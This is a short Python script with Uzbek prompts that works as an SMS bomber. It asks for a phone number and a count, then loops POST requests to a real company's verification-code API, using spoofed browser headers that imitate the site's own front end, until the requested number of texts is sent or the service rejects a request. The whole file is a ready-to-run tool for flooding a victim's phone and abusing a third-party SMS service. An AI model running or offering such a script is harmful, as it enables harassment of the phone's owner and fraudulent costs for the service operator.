import requests

def sms_request(nomer, soni):
    url = "https://api.marsit.uz/api/v2/auth/send_code"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "uz,ru-RU;q=0.9,ru;q=0.8,en-US;q=0.7,en;q=0.6",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://space.marsit.uz",
        "Referer": "https://space.marsit.uz/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua": '"Not A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    }
    data = {
        "phone": f"+998{nomer}"
    }
    print("Sms yuborilmoqda!")
    for i in range(soni):
        response = requests.post(url, headers=headers, json=data).status_code
        if response != 200:
            print("Tugatildi!")
            break
    print("Sms yuborish tugatildi!")

while True:
    try:
        print("Chiqish uchun 0 ni kiriting")
        soni = int(input("Nechta sms jo'nate shef aka? "))
        if soni == 0:
            print("Dastur tugatildi!")
            break
        nomer = int(input("Telefon nomeriz nechidi boy aka: "))
        sms_request(nomer, soni)
    except ValueError:
        print("Iltimos, to'g'ri raqam kiriting!")
